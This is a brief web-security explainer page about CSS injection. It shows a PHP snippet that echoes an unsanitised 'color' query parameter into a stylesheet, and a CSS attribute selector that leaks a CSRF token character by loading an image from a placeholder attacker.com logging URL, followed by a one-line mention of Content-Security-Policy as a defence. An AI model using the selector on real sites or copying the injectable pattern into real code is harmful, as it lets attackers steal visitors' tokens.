---
title: 'CSS Injection'
description: 'An attacker manages to upload malicious CSS code to your website which will run on your visitors browsers.'
pubDate: 'Jul 08 2022'
heroImage: '/cssi.png'
slug: 'vulnerabilities/cssi'
---

```javascript
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}

input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}

```

### How to protect

Is using CSP Header (Content-Security-Policy) which allows you to prevent browsers from executing malicious code on your website.
